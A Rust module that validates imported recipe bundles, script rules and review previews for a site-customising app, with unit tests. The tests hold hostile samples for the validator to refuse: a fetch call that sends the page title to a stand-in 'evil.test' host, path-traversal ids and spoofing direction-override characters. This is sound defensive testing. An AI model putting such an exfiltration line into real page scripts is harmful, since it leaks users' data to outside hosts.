//! Recipes that come from outside the app: pasted bundles and the bundled library. Everything
//! in them is the sender's claim, so the sender's `origin` and id prefix are
//! replaced before validation, and the text that the review screen will show is checked for
//! characters that could disguise it.

use std::collections::{BTreeMap, HashSet};

use serde::{Deserialize, Serialize};
use url::Url;

use super::matcher::Matcher;
use super::schema::{Origin, Recipe, Rule};
use crate::error::{Error, Result};

pub const IMPORTED_PREFIX: &str = "imported.";
pub const MARKET_PREFIX: &str = "market.";

const BUNDLE_FORMAT: u32 = 1;
const MAX_BUNDLE_BYTES: usize = 1024 * 1024;
const MAX_BUNDLE_RECIPES: usize = 20;
pub const MAX_RECIPE_BYTES: usize = 256 * 1024;
const MAX_ID_CHARS: usize = 80;
const MAX_NAME_CHARS: usize = 60;
const MAX_AUTHOR_CHARS: usize = 60;
pub const MAX_SUMMARY_CHARS: usize = 140;
/// Equal to the Worker's `MAX_NOTES`: authors' research notes can be long.
const MAX_NOTES_CHARS: usize = 4000;
const MAX_OPTION_TEXT_CHARS: usize = 500;
const MAX_RULE_LABEL_CHARS: usize = 80;
const MAX_MATCH_PATTERNS: usize = 20;

/// Where a recipe came from. It decides how the id is treated.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum Source {
    /// A pasted bundle: the id is moved under `imported.` so it can never replace another
    /// recipe, such as an installed library one.
    File,
    /// A recipe of the bundled library (official or community), or one about to be shared: the id
    /// must be `market.` and is kept.
    Bundled,
    /// One of our own saved files: the id must already be under `imported.` or `market.`.
    Stored,
}

#[derive(Serialize, Deserialize)]
#[serde(deny_unknown_fields, rename_all = "camelCase")]
struct Bundle<T> {
    openmedia_bundle: u32,
    recipes: Vec<T>,
}

/// What the review screen shows before anything is saved.
#[derive(Debug, Clone, PartialEq, Serialize)]
#[serde(rename_all = "camelCase")]
pub struct RecipePreview {
    pub id: String,
    pub name: String,
    pub version: String,
    pub author: Option<String>,
    pub notes: Option<String>,
    pub sites: Vec<String>,
    pub options: Vec<OptionPreview>,
    /// The tabs of a hub, each with the site it opens; empty for an ordinary recipe.
    pub tabs: Vec<TabPreview>,
    pub rules: Vec<RulePreview>,
    /// Whether any rule runs code on the pages.
    pub runs_code: bool,
    /// The version already installed under this id, which saving would replace.
    pub replaces: Option<String>,
}

#[derive(Debug, Clone, PartialEq, Serialize)]
#[serde(rename_all = "camelCase")]
pub struct OptionPreview {
    pub label: String,
    pub description: String,
    pub on_by_default: bool,
}

#[derive(Debug, Clone, PartialEq, Serialize)]
#[serde(rename_all = "camelCase")]
pub struct TabPreview {
    pub label: String,
    pub url: String,
    pub host: String,
}

#[derive(Debug, Clone, PartialEq, Serialize)]
#[serde(rename_all = "camelCase")]
pub struct RulePreview {
    pub label: String,
    pub kind: &'static str,
    pub selector: String,
    pub declarations: BTreeMap<String, String>,
    /// The text of a script rule, shown in full so the user reads what would run.
    pub code: Option<String>,
}

pub fn export_bundle(recipes: &[Recipe]) -> Result<String> {
    let bundle = Bundle {
        openmedia_bundle: BUNDLE_FORMAT,
        recipes: recipes.to_vec(),
    };
    Ok(serde_json::to_string_pretty(&bundle)?)
}

pub fn parse_bundle(text: &str) -> Result<Vec<Recipe>> {
    if text.len() > MAX_BUNDLE_BYTES {
        return Err(Error::Recipe("the bundle is too large".into()));
    }
    let bundle: Bundle<serde_json::Value> =
        serde_json::from_str(text).map_err(|e| Error::Recipe(e.to_string()))?;
    if bundle.openmedia_bundle != BUNDLE_FORMAT {
        return Err(Error::Recipe(format!(
            "unsupported bundle format {}",
            bundle.openmedia_bundle
        )));
    }
    if bundle.recipes.is_empty() || bundle.recipes.len() > MAX_BUNDLE_RECIPES {
        return Err(Error::Recipe(format!(
            "a bundle holds 1 to {MAX_BUNDLE_RECIPES} recipes"
        )));
    }
    let recipes = bundle
        .recipes
        .into_iter()
        .map(|value| parse_value(value, Source::File))
        .collect::<Result<Vec<_>>>()?;
    let mut seen = HashSet::new();
    if let Some(duplicate) = recipes
        .iter()
        .find(|recipe| !seen.insert(recipe.id.as_str()))
    {
        return Err(Error::Recipe(format!(
            "the bundle has two recipes with id {}",
            duplicate.id
        )));
    }
    Ok(recipes)
}

pub fn parse_shared(json: &[u8], source: Source) -> Result<Recipe> {
    if json.len() > MAX_RECIPE_BYTES {
        return Err(Error::Recipe("the recipe is too large".into()));
    }
    let value = serde_json::from_slice(json).map_err(|e| Error::Recipe(e.to_string()))?;
    parse_value(value, source)
}

fn parse_value(value: serde_json::Value, source: Source) -> Result<Recipe> {
    if value.to_string().len() > MAX_RECIPE_BYTES {
        return Err(Error::Recipe("the recipe is too large".into()));
    }
    let mut recipe: Recipe =
        serde_json::from_value(value).map_err(|e| Error::Recipe(e.to_string()))?;
    recipe.origin = Origin::Imported;
    recipe.id = shared_id(source, &recipe.id)?;
    recipe.validate()?;
    check_shared(&recipe)?;
    Ok(recipe)
}

fn shared_id(source: Source, id: &str) -> Result<String> {
    let has_prefix = id.starts_with(IMPORTED_PREFIX) || id.starts_with(MARKET_PREFIX);
    let id = match source {
        Source::File if id.starts_with(IMPORTED_PREFIX) => id.to_owned(),
        Source::File => format!("{IMPORTED_PREFIX}{id}"),
        Source::Bundled if id.starts_with(MARKET_PREFIX) => id.to_owned(),
        Source::Stored if has_prefix => id.to_owned(),
        Source::Bundled | Source::Stored => {
            return Err(Error::Recipe(format!("recipe id {id} is not allowed here")));
        }
    };
    let rest = id
        .strip_prefix(IMPORTED_PREFIX)
        .or_else(|| id.strip_prefix(MARKET_PREFIX))
        .unwrap_or_default();
    let well_formed = id.len() <= MAX_ID_CHARS
        && !rest.is_empty()
        && rest
            .chars()
            .all(|c| c.is_ascii_lowercase() || c.is_ascii_digit() || c == '.' || c == '-');
    if well_formed {
        Ok(id)
    } else {
        Err(Error::Recipe(
            "a recipe id uses lowercase letters, digits, '.' and '-' only".into(),
        ))
    }
}

fn check_shared(recipe: &Recipe) -> Result<()> {
    check_version(recipe)?;
    if recipe.matches.len() > MAX_MATCH_PATTERNS {
        return Err(Error::Recipe(format!(
            "recipe {} has too many match patterns",
            recipe.id
        )));
    }
    let meta = recipe.meta.as_ref();
    let texts = [
        (Some(recipe.name.as_str()), MAX_NAME_CHARS),
        (meta.and_then(|m| m.author.as_deref()), MAX_AUTHOR_CHARS),
    ];
    let notes = meta.and_then(|m| m.notes.as_deref());
    let summary = meta.and_then(|m| m.summary.as_deref());
    if summary.is_some_and(|text| text.trim().is_empty() || !is_plain_text(text, MAX_SUMMARY_CHARS))
    {
        return Err(Error::Recipe(format!(
            "recipe {} has a summary that is not 1 to {MAX_SUMMARY_CHARS} plain characters",
            recipe.id
        )));
    }
    let unsafe_header = texts
        .into_iter()
        .any(|(text, limit)| text.is_some_and(|text| !is_plain_text(text, limit)));
    if unsafe_header || notes.is_some_and(|notes| !is_note_text(notes, MAX_NOTES_CHARS)) {
        return Err(Error::Recipe(format!(
            "recipe {} has text that cannot be shown safely",
            recipe.id
        )));
    }
    let option_texts = recipe
        .options
        .iter()
        .flat_map(|option| [&option.label, &option.description]);
    let rule_labels = recipe.rules.iter().map(|rule| match rule {
        Rule::Hide { label, .. } | Rule::Css { label, .. } | Rule::Script { label, .. } => label,
    });
    let tab_labels = recipe
        .hub
        .iter()
        .flat_map(|hub| hub.tabs.iter().map(|tab| &tab.label));
    let unsafe_text = option_texts
        .chain(rule_labels)
        .chain(tab_labels)
        .any(|text| {
            !is_plain_text(text, MAX_RULE_LABEL_CHARS.max(MAX_OPTION_TEXT_CHARS))
                || text.trim().is_empty()
        });
    if unsafe_text {
        return Err(Error::Recipe(format!(
            "recipe {} has text that cannot be shown safely",
            recipe.id
        )));
    }
    check_homepage(recipe)
}

fn check_version(recipe: &Recipe) -> Result<()> {
    if is_version(&recipe.version) {
        Ok(())
    } else {
        Err(Error::Recipe(format!(
            "recipe {} needs a version like 1.0.0",
            recipe.id
        )))
    }
}

/// Three dot-separated numbers of at most four digits: `1.0.0`.
pub(crate) fn is_version(version: &str) -> bool {
    let parts: Vec<&str> = version.split('.').collect();
    parts.len() == 3
        && parts.iter().all(|part| {
            !part.is_empty() && part.len() <= 4 && part.bytes().all(|b| b.is_ascii_digit())
        })
}

/// A favorite made from a recipe opens its homepage under the recipe's name, so a shared recipe
/// must not point it at a site its own patterns do not cover.
fn check_homepage(recipe: &Recipe) -> Result<()> {
    let Some(homepage) = recipe.homepage() else {
        return Ok(());
    };
    let covered = Url::parse(homepage).is_ok_and(|url| {
        recipe
            .matches
            .iter()
            .filter_map(|pattern| Matcher::parse(pattern).ok())
            .any(|matcher| matcher.matches(&url))
    });
    if covered {
        Ok(())
    } else {
        Err(Error::Recipe(format!(
            "recipe {} has a homepage its own match patterns do not cover",
            recipe.id
        )))
    }
}

/// Text the user reads while deciding. No control characters, and none of the invisible
/// direction overrides that can make one string read as another.
pub(crate) fn is_plain_text(text: &str, limit: usize) -> bool {
    text.chars().count() <= limit
        && !text.chars().any(|c| {
            c.is_control()
                || matches!(c, '\u{200B}'..='\u{200F}' | '\u{202A}'..='\u{202E}' | '\u{2066}'..='\u{2069}' | '\u{FEFF}')
        })
}

/// Notes are Markdown, so they may break lines; everything else `is_plain_text` refuses stays
/// refused.
fn is_note_text(text: &str, limit: usize) -> bool {
    is_plain_text(&text.replace('\n', " "), limit)
}

pub fn preview(recipe: &Recipe, installed_version: Option<&str>) -> RecipePreview {
    let meta = recipe.meta.as_ref();
    RecipePreview {
        id: recipe.id.clone(),
        name: recipe.name.clone(),
        version: recipe.version.clone(),
        author: meta.and_then(|m| m.author.clone()),
        notes: meta.and_then(|m| m.notes.clone()),
        sites: recipe.matches.clone(),
        options: recipe
            .options
            .iter()
            .map(|option| OptionPreview {
                label: option.label.clone(),
                description: option.description.clone(),
                on_by_default: option.enabled_by_default,
            })
            .collect(),
        rules: recipe.rules.iter().map(rule_preview).collect(),
        runs_code: recipe
            .rules
            .iter()
            .any(|rule| matches!(rule, Rule::Script { .. })),
        tabs: tab_previews(recipe),
        replaces: installed_version.map(str::to_owned),
    }
}

fn tab_previews(recipe: &Recipe) -> Vec<TabPreview> {
    recipe
        .hub
        .iter()
        .flat_map(|hub| &hub.tabs)
        .map(|tab| TabPreview {
            label: tab.label.clone(),
            url: tab.url.clone(),
            host: Url::parse(&tab.url)
                .ok()
                .and_then(|url| url.host_str().map(str::to_owned))
                .unwrap_or_default(),
        })
        .collect()
}

fn rule_preview(rule: &Rule) -> RulePreview {
    match rule {
        Rule::Hide { label, target, .. } => RulePreview {
            label: label.clone(),
            kind: "hide",
            selector: target.css.clone(),
            declarations: BTreeMap::new(),
            code: None,
        },
        Rule::Script { label, code, .. } => RulePreview {
            label: label.clone(),
            kind: "script",
            selector: String::new(),
            declarations: BTreeMap::new(),
            code: Some(code.clone()),
        },
        Rule::Css {
            label,
            target,
            declarations,
            ..
        } => RulePreview {
            label: label.clone(),
            kind: "css",
            selector: target.css.clone(),
            declarations: declarations.clone(),
            code: None,
        },
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    fn recipe_json(id: &str, extra: &str) -> String {
        format!(
            r#"{{
                "schema": 1, "id": "{id}", "name": "Calm", "version": "1.0.0",
                "origin": "user", "tags": ["mobile"], "match": ["https://*.example.com/*"],
                "options": [{{"id": "shorts", "label": "Hide shorts", "description": "The shorts shelf.",
                              "group": "content", "default": false}}],
                "rules": [{{"id": "r1", "label": "Shelf", "type": "hide", "option": "shorts",
                            "target": {{"css": ".shelf"}}}}]
                {extra}
            }}"#
        )
    }

    fn bundle_of(recipes: &[String]) -> String {
        format!(
            r#"{{"openmediaBundle": 1, "recipes": [{}]}}"#,
            recipes.join(",")
        )
    }

    fn file(json: &str) -> Result<Recipe> {
        parse_shared(json.as_bytes(), Source::File)
    }

    fn hub_of(tabs: &str) -> String {
        recipe_json("hub", &format!(r#", "hub": {{"tabs": [{tabs}]}}"#)).replace(
            "https://*.example.com/*",
            "https://www.example.com/inbox/*\", \"https://chat.example.org/*",
        )
    }

    const TAB_A: &str = r#"{"label": "Mail", "url": "https://www.example.com/inbox/"}"#;
    const TAB_B: &str = r#"{"label": "Chat", "url": "https://chat.example.org/"}"#;

    #[test]
    fn a_hub_of_covered_https_pages_is_accepted_and_previewed_tab_by_tab() {
        let recipe = file(&hub_of(&format!("{TAB_A},{TAB_B}"))).unwrap();
        let tabs = preview(&recipe, None).tabs;
        assert_eq!(tabs.len(), 2);
        assert_eq!(tabs[1].host, "chat.example.org");
        assert!(
            preview(&file(&recipe_json("calm", "")).unwrap(), None)
                .tabs
                .is_empty()
        );
    }

    #[test]
    fn a_hub_needs_two_to_six_distinct_https_tabs_the_recipe_covers() {
        let outside = r#"{"label": "Evil", "url": "https://evil.test/"}"#;
        let http = r#"{"label": "Chat", "url": "http://chat.example.org/"}"#;
        let credentials = r#"{"label": "Chat", "url": "https://me:pw@chat.example.org/"}"#;
        let backslash = r#"{"label": "Chat", "url": "https://chat.example.org\\evil"}"#;
        let invisible_url = r#"{"label": "Chat", "url": "https://chat.example.org/\u202e"}"#;
        let blank = r#"{"label": " ", "url": "https://chat.example.org/"}"#;
        let long =
            r#"{"label": "A label of more than twenty", "url": "https://chat.example.org/"}"#;
        let invisible = "{\"label\": \"Cha\u{202E}t\", \"url\": \"https://chat.example.org/\"}";
        for tabs in [
            TAB_A.to_owned(),
            format!("{TAB_A},{TAB_A}"),
            format!("{TAB_A},{outside}"),
            format!("{TAB_A},{http}"),
            format!("{TAB_A},{credentials}"),
            format!("{TAB_A},{backslash}"),
            format!("{TAB_A},{invisible_url}"),
            format!("{TAB_A},{blank}"),
            format!("{TAB_A},{long}"),
            format!("{TAB_A},{invisible}"),
            [TAB_B; 7].join(","),
        ] {
            assert!(file(&hub_of(&tabs)).is_err(), "{tabs}");
        }
    }

    #[test]
    fn a_file_cannot_use_a_broad_match_and_cannot_claim_a_removed_origin() {
        let broad = recipe_json("calm", "").replace("https://*.example.com/*", "https://*/*");
        assert!(file(&broad).is_err());
        let bundled = recipe_json("calm", "").replace("\"user\"", "\"bundled\"");
        assert!(file(&bundled).is_err());
    }

    #[test]
    fn a_file_is_always_imported_whatever_origin_it_claims() {
        let json = recipe_json("calm", "").replace("\"user\"", "\"ai\"");
        assert_eq!(file(&json).unwrap().origin, Origin::Imported);
    }

    #[test]
    fn an_import_needs_valid_platform_tags() {
        assert!(file(&recipe_json("calm", "")).is_ok());
        let without = recipe_json("calm", "").replace("\"tags\": [\"mobile\"],", "");
        assert!(file(&without).is_err());
        for bad in [
            "[]",
            "[\"official\"]",
            "[\"community\"]",
            "[\"mobile\", \"mobile\"]",
            "[\"tv\"]",
            "[\"mobile\", \"desktop\", \"desktop\"]",
        ] {
            let json = recipe_json("calm", "").replace("[\"mobile\"],", &format!("{bad},"));
            assert!(file(&json).is_err(), "{bad}");
        }
        let both = recipe_json("calm", "").replace("[\"mobile\"],", "[\"desktop\", \"mobile\"],");
        assert_eq!(file(&both).unwrap().tags, ["desktop", "mobile"]);
    }

    #[test]
    fn a_file_id_is_moved_under_imported_so_it_cannot_replace_an_installed_recipe() {
        assert_eq!(
            file(&recipe_json("instagram.default", "")).unwrap().id,
            "imported.instagram.default"
        );
        assert_eq!(
            file(&recipe_json("market.calm", "")).unwrap().id,
            "imported.market.calm"
        );
        assert_eq!(
            file(&recipe_json("imported.calm", "")).unwrap().id,
            "imported.calm"
        );
    }

    #[test]
    fn only_the_bundled_path_may_use_a_market_id() {
        let json = recipe_json("market.calm", "");
        assert_eq!(
            parse_shared(json.as_bytes(), Source::Bundled).unwrap().id,
            "market.calm"
        );
        assert!(parse_shared(recipe_json("calm", "").as_bytes(), Source::Bundled).is_err());
        assert!(parse_shared(recipe_json("custom.calm", "").as_bytes(), Source::Stored).is_err());
    }

    #[test]
    fn ids_that_could_leave_the_recipes_folder_or_overflow_are_refused() {
        assert!(file(&recipe_json("../escape", "")).is_err());
        assert!(file(&recipe_json("a/b", "")).is_err());
        assert!(file(&recipe_json("Upper", "")).is_err());
        assert!(file(&recipe_json(&"x".repeat(100), "")).is_err());
    }

    #[test]
    fn invisible_direction_overrides_and_control_characters_are_refused() {
        let spoofed = recipe_json("calm", "").replace("Calm", "Ca\u{202E}lm");
        assert!(file(&spoofed).is_err());
        let control = recipe_json("calm", "").replace("The shorts shelf.", "line\\u0007bell");
        assert!(file(&control).is_err());
    }

    #[test]
    fn a_homepage_the_recipe_does_not_cover_is_refused() {
        let outside = r#", "meta": {"homepage": "https://evil.test/"}"#;
        assert!(file(&recipe_json("calm", outside)).is_err());
        let inside = r#", "meta": {"homepage": "https://www.example.com/"}"#;
        assert!(file(&recipe_json("calm", inside)).is_ok());
    }

    #[test]
    fn notes_may_break_lines_but_other_text_may_not() {
        let meta = |key: &str, value: &str| format!(r#", "meta": {{"{key}": "{value}"}}"#);
        assert!(file(&recipe_json("calm", &meta("notes", r"- one\n- two"))).is_ok());
        assert!(file(&recipe_json("calm", &meta("notes", r"one\r\ntwo"))).is_err());
        assert!(file(&recipe_json("calm", &meta("notes", r"one\ttwo"))).is_err());
        assert!(file(&recipe_json("calm", &meta("author", r"one\ntwo"))).is_err());
    }

    #[test]
    fn a_summary_is_one_to_140_plain_characters() {
        let summary = |text: &str| format!(r#", "meta": {{"summary": "{text}"}}"#);
        assert!(file(&recipe_json("calm", &summary("Hides the shorts shelf."))).is_ok());
        assert!(file(&recipe_json("calm", &summary(""))).is_err());
        assert!(file(&recipe_json("calm", &summary("  "))).is_err());
        assert!(file(&recipe_json("calm", &summary(&"s".repeat(141)))).is_err());
        assert!(file(&recipe_json("calm", &summary(&"s".repeat(140)))).is_ok());
        assert!(file(&recipe_json("calm", &summary(r"one\ntwo"))).is_err());
    }

    #[test]
    fn notes_may_be_long_but_not_longer_than_the_cap() {
        let notes = |len: usize| format!(r#", "meta": {{"notes": "{}"}}"#, "n".repeat(len));
        assert!(file(&recipe_json("calm", &notes(MAX_NOTES_CHARS))).is_ok());
        assert!(file(&recipe_json("calm", &notes(MAX_NOTES_CHARS + 1))).is_err());
    }

    #[test]
    fn unknown_fields_are_refused() {
        assert!(file(&recipe_json("calm", ", \"extra\": 1")).is_err());
    }

    #[test]
    fn a_version_must_be_three_numbers() {
        assert!(file(&recipe_json("calm", "").replace("1.0.0", "1.0")).is_err());
        assert!(file(&recipe_json("calm", "").replace("1.0.0", "1.0.0-beta")).is_err());
    }

    #[test]
    fn a_bundle_round_trips_and_exports_the_tags() {
        let recipe = file(&recipe_json("calm", "")).unwrap();
        let text = export_bundle(std::slice::from_ref(&recipe)).unwrap();
        assert!(text.contains("\"tags\""));
        assert_eq!(parse_bundle(&text).unwrap(), vec![recipe]);
    }

    #[test]
    fn a_bundle_is_refused_when_malformed_oversized_or_duplicated() {
        let one = recipe_json("calm", "");
        assert!(parse_bundle(&bundle_of(&[])).is_err());
        assert!(parse_bundle(&bundle_of(&[one.clone(), one.clone()])).is_err());
        let many: Vec<String> = (0..21).map(|n| recipe_json(&format!("r{n}"), "")).collect();
        assert!(parse_bundle(&bundle_of(&many)).is_err());
        assert!(
            parse_bundle(
                &bundle_of(std::slice::from_ref(&one))
                    .replace("\"openmediaBundle\": 1", "\"openmediaBundle\": 2")
            )
            .is_err()
        );
        assert!(parse_bundle(&bundle_of(&[one]).replace("}]}", "}], \"x\": 1}")).is_err());
        assert!(parse_bundle(&"x".repeat(MAX_BUNDLE_BYTES + 1)).is_err());
    }

    #[test]
    fn the_preview_lists_every_rule_and_what_it_would_replace() {
        let recipe = file(&recipe_json("calm", "")).unwrap();
        let preview = preview(&recipe, Some("0.9.0"));
        assert_eq!(preview.id, "imported.calm");
        assert_eq!(preview.replaces.as_deref(), Some("0.9.0"));
        assert_eq!(preview.rules.len(), 1);
        assert_eq!(preview.rules[0].selector, ".shelf");
        assert_eq!(preview.rules[0].kind, "hide");
    }

    fn script_recipe(code: &str) -> String {
        let code = serde_json::to_string(code).unwrap();
        recipe_json("calm", "").replace(
            r#""type": "hide", "option": "shorts",
                            "target": {"css": ".shelf"}"#,
            &format!(r#""type": "script", "option": "shorts", "code": {code}"#),
        )
    }

    const CLEAN: &str = "for (const post of document.querySelectorAll('.post')) {\n  if (post.textContent.includes('Sponsored')) post.hidden = true;\n}";
    const LEAKY: &str = "fetch('https://evil.test/?c=' + document.title);";

    #[test]
    fn an_imported_script_that_calls_fetch_is_refused_naming_the_finding() {
        let text = file(&script_recipe(LEAKY)).unwrap_err().to_string();
        assert!(text.contains("script rule r1 is refused"), "{text}");
        assert!(text.contains("network at line 1"), "{text}");
    }

    #[test]
    fn the_bundled_path_enforces_the_policy_too() {
        let json = script_recipe(LEAKY).replace("\"calm\"", "\"market.calm\"");
        assert!(parse_shared(json.as_bytes(), Source::Bundled).is_err());
    }

    #[test]
    fn the_same_script_is_accepted_when_the_assistant_wrote_it() {
        let json = script_recipe(LEAKY);
        let mut recipe: Recipe = serde_json::from_str(&json).unwrap();
        recipe.origin = Origin::Ai;
        assert!(recipe.validate().is_ok());
    }

    #[test]
    fn a_clean_script_is_accepted_when_imported_and_previewed_with_its_code() {
        let recipe = file(&script_recipe(CLEAN)).unwrap();
        let preview = preview(&recipe, None);
        assert!(preview.runs_code);
        assert_eq!(preview.rules[0].kind, "script");
        assert_eq!(preview.rules[0].code.as_deref(), Some(CLEAN));
        assert!(preview.rules[0].selector.is_empty());
        assert!(!super::preview(&file(&recipe_json("calm", "")).unwrap(), None).runs_code);
    }

    #[test]
    fn scripts_round_trip_through_a_bundle_unchanged() {
        let recipe = file(&script_recipe(CLEAN)).unwrap();
        let text = export_bundle(std::slice::from_ref(&recipe)).unwrap();
        assert_eq!(parse_bundle(&text).unwrap(), vec![recipe]);
    }
}
